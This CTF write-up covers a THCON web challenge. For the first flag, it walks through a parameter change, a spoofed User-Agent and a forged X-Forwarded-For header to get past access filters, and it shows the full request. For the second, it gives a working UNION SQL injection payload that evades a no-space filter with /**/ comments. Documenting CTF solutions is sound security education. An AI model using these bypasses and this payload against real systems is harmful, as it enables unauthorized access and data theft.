### Write up

#### First flag : 
To solve the first flag, we need to analyze the provided website and identify the `GET parameter in the URL` when consulting the members file.
we replace this with `0` to get access to the dev's file and get access to the url of the unfinished part of the site. Once we have the url, we have to change our user agent to "`XSS_SUPER_NAV`" (not case sensitive) to bypass the UA filter. For the IP filter, we need to add a parameter X-Forwarded-For with a valid url (starting with `192.168`, `192.168.0.3` works). **FIRST FLAG IS OBTAINED ON ACCESSING THIS PAGE.**

request will look something like this : 

- GET /operations-3198102432DDA HTTP/2 
- Host: construction-zone.ctf.thcon.party
- **User-Agent: XSS_Super_NAV**
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
- image/webp,image/png,image/svg+xml,*/*;q=0.8
- Accept-Language: en-US,en;q=0.5
- Accept-Encoding: gzip, deflate, br
- Upgrade-Insecure-Requests: 1
- Sec-Fetch-Dest: document
- **X-Forwarded-For: 192.168.0.3**
- Sec-Fetch-Mode: navigate
- Sec-Fetch-Site: none
- Sec-Fetch-User: ?1
- Priority: u=0, i
- Te: trailers


#### Second flag :
Once this is done we have access to the operation page where we can access the ongoing operations using the members ids but this gives you no information about the members list. We have to use a SQL injection to obtain the members name with a `Union attack` to access the users table (The infos about the db architecture can be found in the html code of the page). Problem is, there's an homemade filter built in the application that disallows spaces in the SQL query. To bypass this, we need to replace the space with `/**/` which will be interpreted as a space by the DBMS. The following payload should retrieve the flag : `'/**/Union/**/SELECT/**/username,1,1/**/from/**/users/**/--`
